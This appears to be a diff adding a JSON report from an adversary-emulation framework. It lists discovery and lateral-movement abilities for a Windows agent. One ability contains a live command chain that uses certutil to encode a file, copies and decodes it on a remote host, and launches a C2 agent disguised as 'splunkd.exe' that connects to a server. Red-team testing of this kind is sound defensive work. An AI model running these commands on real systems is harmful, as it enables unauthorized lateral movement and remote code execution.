@@ -1,0 +1,71 @@
+{
+  "agent_paw": "fgdafj",
+  "agent_host": "WS10",
+  "agent_platform": "windows",
+  "agent_executors": [
+    "cmd",
+    "psh",
+    "proc"
+  ],
+  "adversary_id": "temp-seed-fgdafj-1775114934",
+  "adversary_name": "Temp Seed Windows - Lateral Movement - Certutil",
+  "referenced_ability_count": 3,
+  "compatible_count": 3,
+  "incompatible_count": 0,
+  "missing_count": 0,
+  "fixed_embedded_count": 0,
+  "compatible": [
+    {
+      "ability_id": "13379ae1-d20e-4162-91f8-320d78a35e7f",
+      "name": "Discover local hosts",
+      "tactic": "discovery",
+      "technique_id": "T1018",
+      "resolution": "live",
+      "reason": "compatible",
+      "noisy_score": 3,
+      "windows_command": "Import-Module .\\powerview.ps1;\nGet-DomainComputer",
+      "has_requirements": false,
+      "unresolved_placeholders": [],
+      "seed_ready": true,
+      "seed_reason": "seed-ready"
+    },
+    {
+      "ability_id": "74d1b640-7f1e-4b36-beba-23a8228f39e0",
+      "name": "Local FQDN",
+      "tactic": "discovery",
+      "technique_id": "TA0007",
+      "resolution": "live",
+      "reason": "compatible",
+      "noisy_score": 3,
+      "windows_command": "[System.Net.Dns]::GetHostByName($env:computerName).HostName",
+      "has_requirements": false,
+      "unresolved_placeholders": [],
+      "seed_ready": true,
+      "seed_reason": "seed-ready"
+    },
+    {
+      "ability_id": "96d3c175-5e58-424c-8350-d7514b28a075",
+      "name": "Lateral Movement - Certutil",
+      "tactic": "lateral-movement",
+      "technique_id": "T1570",
+      "resolution": "live",
+      "reason": "compatible",
+      "noisy_score": 2,
+      "windows_command": "certutil -encode #{location} C:\\users\\public\\com.crt | out-null;\ninvoke-command #{remote.host.fqdn} -scriptblock { certutil -decode \\\\#{local.host.fqdn}\\c$\\users\\public\\com.crt #{location}; invoke-wmimethod -computername . -class win32_process -name Create -argumentlist \"C:\\users\\public\\splunkd.exe -server #{server} -group red\" }\n",
+      "has_requirements": true,
+      "unresolved_placeholders": [
+        "#{location}",
+        "#{remote.host.fqdn}",
+        "#{local.host.fqdn}",
+        "#{location}",
+        "#{server}"
+      ],
+      "seed_ready": false,
+      "seed_reason": "has requirements"
+    }
+  ],
+  "incompatible": [],
+  "missing": [],
+  "noisy_only_mode": false,
+  "seed_only_mode": false
+}
